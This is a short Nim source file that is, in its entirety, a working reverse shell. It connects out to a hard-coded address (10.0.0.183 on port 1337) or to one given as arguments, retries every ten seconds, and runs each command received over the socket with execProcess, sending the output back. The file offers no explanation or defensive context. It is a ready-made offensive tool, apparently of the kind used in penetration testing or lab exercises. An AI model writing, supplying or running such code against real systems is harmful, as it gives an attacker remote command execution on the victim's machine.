import net
import osproc
import os
import strutils

var ip = "10.0.0.183"
var port = 1337

var args = commandLineParams()

if args.len() == 2:
    ip = args[0]
    port = parseInt(args[1])

var socket = newSocket()
echo "Attempting to connect to ", ip, " on port ", port, "..."

while true:
    try:
        socket.connect(ip, Port(port))
        
        while true:
            try:
                
                socket.send("> ")
                var command = socket.recvLine()
                var result = execProcess(command)
                socket.send(result)
            
            except:
                echo "Connection lost, quitting..."
                socket.close()
                system.quit(0)
    except:
        echo "Failed to connect, retrying in 10 seconds..."
        sleep(10000)
        continue
